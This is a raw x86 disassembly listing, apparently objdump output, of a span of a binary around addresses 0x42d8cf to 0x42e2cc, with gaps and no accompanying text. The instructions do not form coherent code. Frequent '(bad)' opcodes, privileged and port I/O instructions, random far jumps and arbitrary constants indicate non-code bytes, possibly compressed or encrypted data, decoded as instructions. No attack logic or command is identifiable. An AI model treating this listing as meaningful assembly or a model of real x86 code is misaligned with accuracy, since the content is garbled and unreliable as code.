  42d8cf:	pop    edi
  42d8d0:	and    eax,0x41afad29
  42d8d5:	or     al,0xf9
  42d8d7:	or     edx,DWORD PTR [ebx]
  42d8d9:	pop    ebp
  42d8da:	and    DWORD PTR [edi-0x39],esp
  42d8dd:	mov    edi,0x77de59f4
  42d8e2:	sbb    al,0x9f
  42d8e4:	cld    
  42d8e5:	adc    cl,0xc9
  42d8e8:	div    DWORD PTR ss:[ebx+ebp*2]
  42d8ec:	fstp   QWORD PTR [edx-0x62c454d1]
  42d8f2:	int3   
  42d8f3:	nop
  42d8f4:	cld    
  42d8f5:	out    dx,al
  42d8f6:	inc    eax
  42d8f7:	xor    DWORD PTR cs:[edi+0x53],0xffffffaa
  42d8fc:	sub    al,0x3d
  42d8fe:	hlt    
  42d8ff:	fcomp  QWORD PTR [esi-0x6a]
  42d902:	popa   
  42d903:	mov    al,0xe0
  42d905:	aad    0x5
  42d907:	loope  0x42d899
  42d909:	out    dx,al
  42d90a:	cmp    DWORD PTR [eax+ecx*4],eax
  42d90d:	mov    al,0x86
  42d90f:	xchg   esp,eax
  42d910:	(bad)  
  42d911:	and    eax,0xc095a7da
  42d916:	pop    eax
  42d917:	mov    ds:0x95ab89db,al
  42d91c:	inc    ebp
  42d91d:	shr    BYTE PTR [eax],0x8e
  42d920:	mov    ebx,esp
  42d922:	test   eax,0xfa8d844
  42d927:	mov    DWORD PTR [edi+0x41],edi
  42d92a:	ficom  DWORD PTR [ebp+0x22]
  42d92d:	pop    ds
  42d92e:	sbb    BYTE PTR [eax],bh
  42d930:	adc    bh,BYTE PTR ds:0x5fd85c
	...
  42d996:	stc    
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0xcc015d14,ecx
  42d9a5:	imul   BYTE PTR [ebx-0x18]
  42d9a8:	add    DWORD PTR [eax],eax
  42d9aa:	pop    es
  42d9ab:	add    DWORD PTR [eax],eax
  42d9ad:	add    cl,dl
  42d9af:	dec    ecx
  42d9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d9b1:	pushf  
  42d9b2:	adc    edx,DWORD PTR [ebp+0x39]
  42d9b5:	xchg   BYTE PTR [ecx+ebx*2+0x32],ch
  42d9b9:	inc    eax
  42d9ba:	or     BYTE PTR [eax+eax*4-0x1133b985],ch
  42d9c1:	jp     0x42d9ae
  42d9c3:	and    eax,0x2c86615b
  42d9c8:	(bad)  
  42d9c9:	jl     0x42d95c
  42d9cb:	loop   0x42d950
  42d9cd:	xchg   esi,eax
  42d9ce:	jb     0x42d9f6
  42d9d0:	push   ebp
  42d9d1:	and    al,0x45
  42d9d3:	scas   al,BYTE PTR es:[edi]
  42d9d4:	mov    ebp,0x7826391c
  42d9d9:	aas    
  42d9da:	jns    0x42d9a7
  42d9dc:	aaa    
  42d9dd:	mov    ds:0x94e417fb,al
  42d9e2:	(bad)  
  42d9e3:	xor    DWORD PTR [ebx-0x21],esi
  42d9e6:	or     DWORD PTR [ebx+0x7f],edx
  42d9e9:	push   ds
  42d9ea:	inc    esi
  42d9eb:	add    BYTE PTR [edi-0x18],dl
  42d9ee:	sbb    al,BYTE PTR [ebx-0x29dd373c]
  42d9f4:	push   ds
  42d9f5:	ss xor al,0x6a
  42d9f8:	dec    ecx
  42d9f9:	ret    
  42d9fa:	inc    ebp
  42d9fb:	and    DWORD PTR [edi],ebp
  42d9fd:	fwait
  42d9fe:	data16 or BYTE PTR [eax-0x15d49e28],al
  42da05:	test   BYTE PTR [esi],0x4e
  42da08:	or     eax,0xe278c21e
  42da0d:	and    bl,BYTE PTR [ecx]
  42da0f:	hlt    
  42da10:	ins    DWORD PTR es:[edi],dx
  42da11:	fwait
  42da12:	sahf   
  42da13:	or     dl,BYTE PTR [eax+0x7c]
  42da16:	shr    BYTE PTR [edi],1
  42da18:	cmp    DWORD PTR [edi-0x7d],0x53
  42da1c:	repz ss std 
  42da1f:	idiv   BYTE PTR [ebp-0x1eaa2fab]
  42da25:	sub    eax,0x50de2cb5
  42da2a:	adc    eax,0xf31bfd12
  42da2f:	sub    al,0x45
  42da31:	repz inc si
  42da34:	jbe    0x42daaf
  42da36:	popf   
  42da37:	inc    esp
  42da38:	jns    0x42da06
  42da3a:	jns    0x42da69
  42da3c:	xor    al,0x64
  42da3e:	in     eax,dx
  42da3f:	cmp    BYTE PTR [edi+0x63c88b96],dl
  42da45:	fdiv   DWORD PTR [esi]
  42da47:	test   DWORD PTR [eax+0x5e],ebp
  42da4a:	jl     0x42d9db
  42da4c:	mov    esi,0xc53f8f34
  42da51:	mov    DWORD PTR [ebx-0x11aeea6],edx
  42da57:	push   eax
  42da58:	icebp  
  42da59:	or     bh,BYTE PTR [ecx]
  42da5b:	cld    
  42da5c:	mov    al,ds:0xe140dfe5
  42da61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da62:	imul   DWORD PTR [ecx+ecx*2+0x5b915a2d]
  42da69:	push   ss
  42da6a:	inc    eax
  42da6b:	rcr    dl,1
  42da6d:	sub    DWORD PTR [edx],edi
  42da6f:	lea    edi,ds:0x80065e09
  42da75:	(bad)  
  42da76:	sbb    DWORD PTR [ebp+edx*1+0x5f38d0f9],esi
  42da7d:	and    al,al
  42da7f:	inc    esp
  42da80:	mov    bl,0xff
  42da82:	mov    ds:0x89f2fb3f,eax
  42da87:	das    
  42da88:	sbb    ebp,DWORD PTR [esi+0x18]
  42da8b:	mov    ds:0xca5eaf70,eax
  42da90:	adc    BYTE PTR [esi],dh
  42da92:	out    dx,eax
  42da93:	dec    esp
  42da94:	sbb    esi,DWORD PTR [esi]
  42da96:	out    dx,al
  42da97:	adc    al,0x2d
  42da99:	dec    edx
  42da9a:	mov    edi,0x169f6f73
  42da9f:	add    ecx,DWORD PTR [edi+ebp*8-0x44]
  42daa3:	push   edi
  42daa4:	mov    esp,0x644f5533
  42daa9:	inc    esp
  42daaa:	mov    ebx,0xad555b40
  42daaf:	inc    edi
  42dab0:	das    
  42dab1:	cmp    al,0x6b
  42dab3:	mov    al,0xb1
	...
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42db52
  42db23:	push   0xffffff80
  42db25:	mov    ch,0x72
  42db27:	jmp    0x149db2d
  42db2c:	add    BYTE PTR [eax],al
  42db2e:	jne    0x42db8f
  42db30:	scas   al,BYTE PTR es:[edi]
  42db31:	test   al,0x43
  42db33:	and    BYTE PTR [ebx-0x21],0xed
  42db37:	cmp    dl,BYTE PTR [bp+si-0x6259]
  42db3c:	fild   QWORD PTR cs:[eax+edx*8+0x36]
  42db41:	call   0x806:0x602f6f81
  42db48:	dec    edi
  42db49:	aas    
  42db4a:	retf   0x581d
  42db4d:	cld    
  42db4e:	rol    dh,1
  42db50:	(bad)  
  42db51:	xlat   BYTE PTR ds:[ebx]
  42db52:	sbb    DWORD PTR [ecx+0x4ba82e10],0x1d
  42db59:	mov    ds:0xd1de7f41,eax
  42db5e:	pop    ecx
  42db5f:	jbe    0x42db18
  42db61:	test   dh,ch
  42db63:	nop
  42db64:	add    edi,DWORD PTR [edi+0x45]
  42db67:	mov    dl,0x6d
  42db69:	out    dx,al
  42db6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db6b:	(bad)  [edi+edi*1]
  42db6e:	jo     0x42daf3
  42db70:	and    ah,dh
  42db72:	int    0x5b
  42db74:	shr    BYTE PTR [edx+ecx*1],1
  42db77:	dec    ecx
  42db78:	daa    
  42db79:	push   esi
  42db7a:	lods   eax,DWORD PTR ds:[esi]
  42db7b:	jg     0x42dbee
  42db7d:	mov    WORD PTR ds:0x3fb8a4e,ds
  42db83:	test   BYTE PTR es:[edx],cl
  42db86:	adc    esi,DWORD PTR [ebx]
  42db88:	lock cmp al,0x1e
  42db8b:	sbb    eax,0x74ef1746
  42db90:	jnp    0x42dbe4
  42db92:	repz sbb ebx,DWORD PTR [ebx-0x72]
  42db96:	jecxz  0x42db1b
  42db98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db99:	xor    al,0x94
  42db9b:	jle    0x42dbac
  42db9d:	ins    BYTE PTR es:[edi],dx
  42db9e:	add    dh,bl
  42dba0:	jmp    0x5859:0x6977a46c
  42dba7:	xor    ah,bh
  42dba9:	xchg   ebp,eax
  42dbaa:	(bad)  
  42dbab:	or     al,0x83
  42dbad:	arpl   sp,dx
  42dbaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dbb0:	jmp    0x42dba7
  42dbb2:	sub    BYTE PTR [ebx-0x55597b2d],ah
  42dbb8:	push   ebp
  42dbb9:	fmul   QWORD PTR [edi]
  42dbbb:	push   es
  42dbbc:	push   cs
  42dbbd:	xchg   esi,eax
  42dbbe:	cdq    
  42dbbf:	fistp  WORD PTR [esi]
  42dbc1:	int    0x4c
  42dbc3:	lahf   
  42dbc4:	in     al,0x1d
  42dbc6:	shr    DWORD PTR [edx+0x2f],cl
  42dbc9:	in     eax,dx
  42dbca:	lahf   
  42dbcb:	fstp   TBYTE PTR [ebx+esi*8+0x0]
  42dbcf:	or     edx,DWORD PTR [ebx-0x36]
  42dbd2:	mov    al,ds:0xa9c825d3
  42dbd7:	imul   esi,DWORD PTR [ebx-0xc],0x7ab098f8
  42dbde:	scas   al,BYTE PTR es:[edi]
  42dbdf:	jle    0x42dc24
  42dbe1:	in     al,dx
  42dbe2:	mov    edx,0xcf743f5d
  42dbe7:	adc    edi,DWORD PTR [edi+edi*1+0x19d125ea]
  42dbee:	pop    DWORD PTR [edi+0x6d]
  42dbf1:	nop
  42dbf2:	xor    edi,DWORD PTR [esi+0x2b76e11f]
  42dbf8:	cdq    
  42dbf9:	pop    es
  42dbfa:	or     bl,ch
  42dbfc:	popa   
  42dbfd:	sbb    ecx,DWORD PTR [ebx]
  42dbff:	jmp    0x42db93
  42dc01:	mov    eax,0x819357fe
  42dc06:	cdq    
  42dc07:	shl    BYTE PTR [edi-0x2bf40bcc],1
  42dc0d:	mov    edx,0x745d53e0
  42dc12:	jle    0x42dc4a
  42dc14:	push   esp
  42dc15:	idiv   BYTE PTR [ebp-0x7c]
  42dc18:	mov    dh,0xb6
  42dc1a:	and    al,cl
  42dc1c:	dec    ebp
  42dc1d:	mov    esi,0x83aa1ebd
  42dc22:	add    eax,0x4052f339
  42dc27:	mov    al,0xc7
  42dc29:	pop    ebp
  42dc2a:	xor    BYTE PTR [edx+ecx*1-0x5a292187],bl
  42dc31:	inc    edi
  42dc32:	and    dl,BYTE PTR [esi+0xfe]
	...
  42dc94:	add    BYTE PTR [eax],al
  42dc96:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0x4890f285
  42dca4:	data16 je 0x42dd20
  42dca7:	jmp    0x0:0x1070001
  42dcae:	xchg   ebp,eax
  42dcaf:	mov    BYTE PTR [esi+0x22d8f192],dl
  42dcb5:	leave  
  42dcb6:	push   esi
  42dcb7:	inc    ebp
  42dcb8:	sub    eax,0xa120d0f
  42dcbd:	lods   eax,DWORD PTR ds:[esi]
  42dcbe:	pusha  
  42dcbf:	xchg   DWORD PTR [edx+edi*2+0x2d17b1a4],edi
  42dcc6:	outs   dx,DWORD PTR ds:[esi]
  42dcc7:	jae    0x42dcb2
  42dcc9:	push   cs
  42dcca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dccb:	pop    eax
  42dccc:	sar    ah,cl
  42dcce:	push   cs
  42dccf:	sbb    edx,eax
  42dcd1:	std    
  42dcd2:	ror    edi,0x7c
  42dcd5:	and    esi,ebp
  42dcd7:	xchg   esi,eax
  42dcd8:	jo     0x42dca4
  42dcda:	dec    esi
  42dcdb:	push   cs
  42dcdc:	add    al,BYTE PTR [ecx+0x348fb12f]
  42dce2:	sub    bh,ch
  42dce4:	mov    DWORD PTR ds:0xe301ce2e,ebp
  42dcea:	imul   edx,DWORD PTR [ebp+0x31],0x8e12dc58
  42dcf1:	(bad)  
  42dcf3:	sti    
  42dcf4:	test   eax,0x6aa44c32
  42dcf9:	sub    al,0xb1
  42dcfb:	push   cs
  42dcfc:	push   esp
  42dcfd:	inc    ebx
  42dcfe:	pop    ebx
  42dcff:	cmp    edi,DWORD PTR [eax+0x4c]
  42dd02:	pop    esp
  42dd03:	or     al,0xff
  42dd05:	add    bl,BYTE PTR [eax]
  42dd07:	hlt    
  42dd08:	jno    0x42dd23
  42dd0a:	sar    DWORD PTR [ebx+0x13231d13],0xae
  42dd11:	ins    DWORD PTR es:[edi],dx
  42dd12:	ret    
  42dd13:	aam    0xd
  42dd15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd16:	(bad)  
  42dd17:	retf   0x420a
  42dd1a:	iret   
  42dd1b:	cmp    DWORD PTR [ebp-0x71],eax
  42dd1e:	mov    dh,0xc9
  42dd20:	mul    BYTE PTR [edx]
  42dd22:	(bad)  
  42dd23:	jge    0x42dd8d
  42dd25:	pop    ebp
  42dd26:	int3   
  42dd27:	pop    esp
  42dd28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd29:	cmp    eax,0xb1543da4
  42dd2e:	into   
  42dd2f:	mov    edx,edi
  42dd31:	imul   edx,DWORD PTR ds:0x6b985ce9,0x4c6b1d63
  42dd3b:	aad    0x2d
  42dd3d:	cwde   
  42dd3e:	dec    edi
  42dd3f:	mov    edi,0x37cc02b5
  42dd44:	xchg   esp,eax
  42dd45:	nop
  42dd46:	test   BYTE PTR [ecx],bh
  42dd48:	cmp    dl,bh
  42dd4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd4b:	xor    al,0x5f
  42dd4d:	sub    DWORD PTR [esi+ebx*2],esi
  42dd50:	std    
  42dd51:	lock jno 0x42ddb8
  42dd54:	fild   DWORD PTR [edi]
  42dd56:	inc    esp
  42dd57:	(bad)  
  42dd58:	xchg   ecx,eax
  42dd59:	sbb    bh,BYTE PTR [edi]
  42dd5b:	rcl    eax,0xfb
  42dd5e:	mov    gs,WORD PTR [edx+ecx*8]
  42dd61:	adc    eax,0xd0f0999
  42dd66:	sub    BYTE PTR [esi-0x62cd96a9],bl
  42dd6c:	jo     0x42dd00
  42dd6e:	daa    
  42dd6f:	and    DWORD PTR [edi-0x78],esi
  42dd72:	jecxz  0x42dd9d
  42dd74:	std    
  42dd75:	jnp    0x42dd79
  42dd77:	push   edi
  42dd78:	jmp    DWORD PTR [ecx*4+0x77494de6]
  42dd7f:	cmp    al,0x67
  42dd81:	into   
  42dd82:	lock in eax,dx
  42dd84:	xor    bh,BYTE PTR ds:[esi]
  42dd87:	or     edi,DWORD PTR [edx+0x2e]
  42dd8a:	cmp    BYTE PTR [edi+0x5b],dl
  42dd8d:	xchg   ebx,eax
  42dd8e:	or     BYTE PTR ds:0x94033819,0xf4
  42dd95:	scas   eax,DWORD PTR es:[edi]
  42dd96:	and    al,0x73
  42dd98:	lds    ebp,FWORD PTR ds:0xa4d9a536
  42dd9e:	pop    esi
  42dd9f:	sub    BYTE PTR [esp+edx*2-0x4a],ch
  42dda3:	xlat   BYTE PTR ds:[ebx]
  42dda4:	std    
  42dda5:	cmc    
  42dda6:	mov    ah,0xc5
  42dda8:	leave  
  42dda9:	pusha  
  42ddaa:	add    DWORD PTR [esi+0x228911f4],eax
  42ddb0:	mov    eax,0xcbbca986
	...
  42de15:	add    dh,ah
  42de17:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0x1c820507
  42de25:	loope  0x42dda7
  42de27:	jmp    0x42de2a
  42de29:	add    BYTE PTR [edi],al
  42de2b:	add    DWORD PTR [eax],eax
  42de2d:	add    BYTE PTR [ecx],dl
  42de2f:	inc    edx
  42de30:	xchg   ebx,eax
  42de31:	fsub   QWORD PTR [edi-0x5291821c]
  42de37:	jne    0x42de08
  42de39:	pop    edx
  42de3a:	fdivr  st(7),st
  42de3c:	rol    DWORD PTR [esi+0x5a],cl
  42de3f:	add    ebp,DWORD PTR [esi]
  42de41:	test   al,dh
  42de43:	sbb    edi,DWORD PTR es:[eax-0xc]
  42de47:	into   
  42de48:	(bad)  
  42de49:	fist   WORD PTR [ebx+0x54]
  42de4c:	inc    edx
  42de4d:	mov    dh,0x44
  42de4f:	fcom   DWORD PTR [ecx+eax*4+0x4e]
  42de53:	xchg   ebx,edx
  42de55:	mov    ebx,DWORD PTR [edi-0xd6876bd]
  42de5b:	jne    0x42de4c
  42de5d:	mov    ebx,0x55eae513
  42de62:	xchg   esi,eax
  42de63:	inc    esi
  42de64:	dec    ecx
  42de65:	mov    al,ds:0xe6d511b3
  42de6a:	ja     0x42de2c
  42de6c:	mov    dh,bl
  42de6e:	dec    edx
  42de6f:	dec    esp
  42de70:	jo     0x42de77
  42de72:	test   al,0x3c
  42de74:	loope  0x42deca
  42de76:	and    DWORD PTR [ebx-0x325b3a37],edi
  42de7c:	cmp    DWORD PTR [ecx],eax
  42de7e:	dec    esi
  42de7f:	in     eax,0xa7
  42de81:	adc    eax,DWORD PTR [eax+0x8d864a0]
  42de87:	and    eax,0x51f66333
  42de8c:	lds    edx,FWORD PTR [eax+0x4a]
  42de8f:	inc    esp
  42de90:	xor    eax,0xbd090f26
  42de95:	adc    BYTE PTR [ebp-0x778e1886],bh
  42de9b:	test   al,0x52
  42de9d:	scas   eax,DWORD PTR es:[edi]
  42de9e:	push   ss
  42de9f:	test   eax,0xdce50753
  42dea4:	les    edx,FWORD PTR [ebx-0x63]
  42dea7:	out    0xc7,eax
  42dea9:	je     0x42deb6
  42deab:	xor    bl,BYTE PTR [ebx]
  42dead:	jge    0x42df05
  42deaf:	ja     0x42de70
  42deb1:	js     0x42deec
  42deb3:	imul   BYTE PTR [eax+0x7d2500d3]
  42deb9:	xor    ebp,DWORD PTR [eax]
  42debb:	add    esi,DWORD PTR [edx+0xd]
  42debe:	fwait
  42debf:	das    
  42dec0:	mov    ebp,0xbfd4ca13
  42dec5:	jmp    0xcc62922f
  42deca:	jle    0x42dea4
  42decc:	fnstsw WORD PTR [ebx-0x7a8d5d95]
  42ded2:	or     bl,BYTE PTR [ecx+0x2d]
  42ded5:	stc    
  42ded6:	call   0x67f6:0xa627d187
  42dedd:	test   DWORD PTR [edi-0x33],esi
  42dee0:	mov    dh,ch
  42dee2:	sar    edi,0x76
  42dee5:	sub    esp,DWORD PTR [ebx+eax*8-0xe428c0f]
  42deec:	fidivr DWORD PTR [edi-0x62ae737e]
  42def2:	bound  edi,QWORD PTR [ebp+0x171bd065]
  42def8:	and    ah,BYTE PTR [eax+ebx*2]
  42defb:	push   cs
  42defc:	bnd jg 0x42df51
  42deff:	scas   al,BYTE PTR es:[edi]
  42df00:	xor    cl,BYTE PTR [ecx]
  42df02:	lahf   
  42df03:	pop    esp
  42df04:	icebp  
  42df05:	(bad)  
  42df06:	stc    
  42df07:	fyl2x  
  42df09:	je     0x42df15
  42df0b:	xchg   edx,eax
  42df0c:	(bad)  
  42df0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df0f:	aad    0xfd
  42df11:	mov    eax,ds:0xbc666c76
  42df16:	das    
  42df17:	pop    ecx
  42df18:	push   es
  42df19:	stos   BYTE PTR es:[edi],al
  42df1a:	fbstp  TBYTE PTR [edi]
  42df1c:	pop    edi
  42df1d:	xchg   DWORD PTR [ebx-0x57373639],edx
  42df23:	je     0x42df0f
  42df25:	add    DWORD PTR [esi],ebx
  42df27:	sahf   
  42df28:	cli    
  42df29:	hlt    
  42df2a:	(bad)  
  42df2b:	out    0xa5,al
  42df2d:	xor    ecx,DWORD PTR [esp+eax*1+0x62]
  42df31:	dec    edx
  42df32:	cmp    eax,eax
  42df34:	xor    BYTE PTR [eax],al
	...
  42df96:	add    bh,dh
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	pusha  
  42dfa3:	fxch   st(2)
  42dfa5:	aam    0x87
  42dfa7:	in     al,dx
  42dfa8:	add    DWORD PTR [eax],eax
  42dfaa:	pop    es
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    BYTE PTR [ecx-0x4a201fe8],dl
  42dfb3:	scas   eax,DWORD PTR es:[edi]
  42dfb4:	pop    edx
  42dfb5:	in     eax,dx
  42dfb6:	adc    esi,0x2b96e16d
  42dfbc:	outs   dx,BYTE PTR ds:[esi]
  42dfbd:	add    cl,0x2b
  42dfc0:	xchg   cl,ah
  42dfc2:	jmp    0x42dfc7
  42dfc4:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42dfc6:	xor    bl,BYTE PTR [edx+0x5d5b85e8]
  42dfcc:	repz fcom QWORD PTR [ebx-0x3c7255ee]
  42dfd3:	xchg   esi,eax
  42dfd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfd5:	in     eax,0x14
  42dfd7:	popa   
  42dfd8:	mov    ecx,ecx
  42dfda:	rcl    DWORD PTR [ecx-0x2f],0x64
  42dfde:	inc    eax
  42dfdf:	retf   
  42dfe0:	xchg   ecx,eax
  42dfe1:	and    eax,0x1303cbb8
  42dfe6:	mov    ch,0xd4
  42dfe8:	test   eax,0x20008f4c
  42dfed:	cmp    dh,BYTE PTR [esi-0x19]
  42dff0:	sti    
  42dff1:	mov    esp,0x8a2b125d
  42dff6:	(bad)  
  42dff7:	adc    al,0x4b
  42dff9:	lds    edx,FWORD PTR [edx+0x62]
  42dffc:	(bad)  
  42dfff:	sar    esp,0x85
  42e002:	lahf   
  42e003:	sbb    al,BYTE PTR [ebx+0x7fac6d8e]
  42e009:	dec    edi
  42e00a:	add    eax,esp
  42e00c:	popf   
  42e00d:	nop
  42e00e:	rcl    DWORD PTR [esi+0x7ac115e9],cl
  42e014:	xor    esp,ebx
  42e016:	in     eax,dx
  42e017:	pusha  
  42e018:	pusha  
  42e019:	repnz sahf 
  42e01b:	inc    ebp
  42e01c:	cli    
  42e01d:	mov    edx,0x5b9a6dad
  42e022:	ret    0xa5e7
  42e025:	into   
  42e026:	dec    ebp
  42e027:	sbb    DWORD PTR [edx+0x7e],0xd
  42e02b:	enter  0xf8be,0x46
  42e02f:	test   BYTE PTR [eax+0x49ad817f],0x65
  42e036:	bound  esp,QWORD PTR [esi*2+0x32bd8d7e]
  42e03d:	in     eax,dx
  42e03e:	xchg   edi,eax
  42e03f:	fwait
  42e040:	jns    0x42e04d
  42e042:	ins    BYTE PTR es:[edi],dx
  42e043:	and    esi,DWORD PTR [ebp+0x12]
  42e046:	mov    ds:0x2fe8c9c1,eax
  42e04b:	cmp    edx,DWORD PTR ds:0x1a364cc2
  42e051:	aad    0x86
  42e053:	adc    BYTE PTR [edi-0x1a],ch
  42e056:	dec    edi
  42e057:	enter  0xa387,0x91
  42e05b:	sub    dh,BYTE PTR [edx+0x26c015de]
  42e061:	adc    DWORD PTR [edx-0x76],ebp
  42e064:	jle    0x42e09e
  42e066:	mov    WORD PTR [ebp+0x47],ss
  42e069:	jbe    0x42e016
  42e06b:	push   eax
  42e06c:	xchg   BYTE PTR [edx-0x5e],ah
  42e06f:	xchg   esp,eax
  42e070:	mov    WORD PTR [edi+0x1a390704],?
  42e076:	imul   ebp,DWORD PTR [eax-0x70a0cdc3],0x5
  42e07d:	xchg   ebp,eax
  42e07e:	jae    0x42e06f
  42e080:	sub    dh,BYTE PTR [edx+ecx*4+0x7b25a923]
  42e087:	jge    0x42e094
  42e089:	add    al,0x3b
  42e08b:	inc    edi
  42e08c:	fidivr DWORD PTR [edx+edx*4+0x25]
  42e090:	sub    BYTE PTR [ebp-0x79],al
  42e093:	retf   0xd5f0
  42e096:	mov    bl,0x5d
  42e098:	adc    BYTE PTR [edi-0x25b164e5],dh
  42e09e:	mov    WORD PTR [ebx],fs
  42e0a0:	pop    eax
  42e0a1:	test   DWORD PTR [ebp+0x4a],edi
  42e0a4:	mov    ecx,DWORD PTR [esi+esi*4+0x32d7ad16]
  42e0ab:	or     cl,al
  42e0ad:	clc    
  42e0ae:	mov    dh,0xf5
  42e0b0:	cmp    dl,BYTE PTR [ecx+0xe6b50c]
	...
  42e116:	mov    eax,ds:0x7e061ecf
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	(bad)  
  42e122:	call   0x8e9262f7
  42e127:	in     eax,dx
  42e128:	add    DWORD PTR [eax],eax
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    cl,dl
  42e12f:	cmc    
  42e130:	mov    bh,0x24
  42e132:	mov    esi,0x45cdc06d
  42e137:	lahf   
  42e138:	in     al,dx
  42e139:	xchg   edi,eax
  42e13a:	mov    dl,0xd7
  42e13c:	xchg   ebp,eax
  42e13d:	les    eax,FWORD PTR [ebx+0x7738fcfe]
  42e143:	mov    al,0x33
  42e145:	es pop ebp
  42e147:	jae    0x42e16d
  42e149:	pop    es
  42e14a:	test   al,0xa
  42e14c:	and    esi,DWORD PTR [ecx-0x11105fbe]
  42e152:	ins    DWORD PTR es:[edi],dx
  42e153:	loop   0x42e196
  42e155:	cmc    
  42e156:	ret    0x41a4
  42e159:	mov    eax,0xc41197d4
  42e15e:	jo     0x42e17d
  42e160:	mov    edx,0x389906c7
  42e165:	or     eax,0x7fbc7083
  42e16a:	xchg   edi,eax
  42e16b:	or     ebp,ebx
  42e16d:	push   eax
  42e16e:	inc    esp
  42e16f:	add    BYTE PTR [ebx],0xaf
  42e172:	shl    ebx,1
  42e174:	or     DWORD PTR [ebp+0x3a],ebp
  42e177:	add    al,0x79
  42e179:	(bad)  
  42e17a:	lahf   
  42e17b:	mov    edi,0xc0c62783
  42e180:	and    al,0xa8
  42e182:	cld    
  42e183:	mov    esi,0x289a7d9d
  42e188:	jg     0x42e1e4
  42e18a:	rol    al,cl
  42e18c:	retf   0x9ce0
  42e18f:	cmc    
  42e190:	out    dx,eax
  42e191:	into   
  42e192:	jge    0x42e1e8
  42e194:	mov    bl,bh
  42e196:	and    edi,esi
  42e198:	lods   eax,DWORD PTR ds:[esi]
  42e199:	or     al,BYTE PTR [ecx-0x9]
  42e19c:	in     al,dx
  42e19d:	xchg   ecx,eax
  42e19e:	mov    ah,0x68
  42e1a0:	pop    ss
  42e1a1:	xor    DWORD PTR [edx+0x2f],ebx
  42e1a4:	mov    dl,BYTE PTR [ecx-0x104d012f]
  42e1aa:	push   ecx
  42e1ab:	std    
  42e1ac:	or     DWORD PTR [ebx],eax
  42e1ae:	xchg   edi,eax
  42e1af:	test   eax,0x2ab19966
  42e1b4:	les    esp,FWORD PTR [edi+0xffa112a]
  42e1ba:	popf   
  42e1bb:	push   0xa09dfa96
  42e1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1c1:	neg    dl
  42e1c3:	mov    edx,0xa8709866
  42e1c8:	fsub   QWORD PTR [eax-0x4b]
  42e1cb:	ins    BYTE PTR es:[edi],dx
  42e1cc:	dec    BYTE PTR [eax-0x4f940576]
  42e1d2:	test   BYTE PTR ds:0xf5237db3,dl
  42e1d8:	xchg   BYTE PTR [ebp+0x53],ch
  42e1db:	retf   
  42e1dc:	ds sbb al,ch
  42e1df:	mov    esi,0x1c72ec80
  42e1e4:	add    al,0x7
  42e1e6:	popa   
  42e1e7:	int3   
  42e1e8:	adc    BYTE PTR [esi+0x14be57d7],bl
  42e1ee:	inc    edx
  42e1ef:	stc    
  42e1f0:	adc    DWORD PTR [ebx+eax*4-0x59],0x78fe0661
  42e1f8:	hlt    
  42e1f9:	adc    DWORD PTR [edx-0x7bbef80b],edx
  42e1ff:	sahf   
  42e200:	push   cs
  42e201:	sub    eax,0x6bdd23bb
  42e206:	mov    esp,0x2db2316f
  42e20b:	outs   dx,BYTE PTR ds:[esi]
  42e20c:	loop   0x42e26d
  42e20e:	sti    
  42e20f:	cmp    eax,ecx
  42e211:	mov    ebp,0x7ec5f43c
  42e216:	jb     0x42e251
  42e218:	pop    eax
  42e219:	(bad)  
  42e21a:	(bad)  
  42e21b:	mov    WORD PTR [si],?
  42e21e:	cwde   
  42e21f:	(bad)  
  42e220:	leave  
  42e221:	mov    cs:0xa2a3e690,eax
  42e227:	jp     0x42e1ac
  42e229:	fst    DWORD PTR [eax]
  42e22b:	xchg   ecx,eax
  42e22c:	inc    ebp
  42e22d:	ja     0x42e1c4
  42e22f:	add    cl,al
  42e231:	adc    eax,0x6ab218
	...
  42e296:	lods   eax,DWORD PTR ds:[esi]
  42e297:	cmp    eax,0xb79aa78a
  42e29c:	lods   eax,DWORD PTR ds:[esi]
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0x7bb2aef2
  42e2a5:	mov    eax,0x1ee95
  42e2aa:	pop    es
  42e2ab:	add    DWORD PTR [eax],eax
  42e2ad:	add    BYTE PTR ds:0xf64a03f3,al
  42e2b3:	cmp    al,0xb
  42e2b5:	push   ss
  42e2b6:	repnz pop ebx
  42e2b8:	fwait
  42e2b9:	cli    
  42e2ba:	mov    dh,0xa4
  42e2bc:	cli    
  42e2bd:	mov    bl,0x15
  42e2bf:	inc    edi
  42e2c0:	aas    
  42e2c1:	push   ebp
  42e2c2:	sub    al,0xe8
  42e2c4:	cmp    eax,0x1db3c0fa
  42e2c9:	popf   
  42e2ca:	fcom   st(7)
  42e2cc:	dec    esp
